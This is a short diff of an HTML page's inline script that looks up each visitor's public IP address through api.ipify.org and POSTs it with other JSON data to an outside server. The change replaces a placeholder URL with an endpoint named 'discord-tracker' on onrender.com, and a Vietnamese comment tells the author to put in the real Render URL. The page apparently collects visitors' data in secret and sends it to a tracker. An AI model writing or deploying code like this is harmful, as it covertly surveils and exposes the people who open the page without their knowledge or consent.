@@ -334,7 +334,7 @@
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
 
-        await fetch("https://ten-app.onrender.com/track", {   // 🔴 ĐỔI thành URL Render thật
+        await fetch("https://discord-tracker-6du5.onrender.com", {   // 🔴 ĐỔI thành URL Render thật
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -350,3 +350,4 @@
     </script>
 </body>
 </html>
+
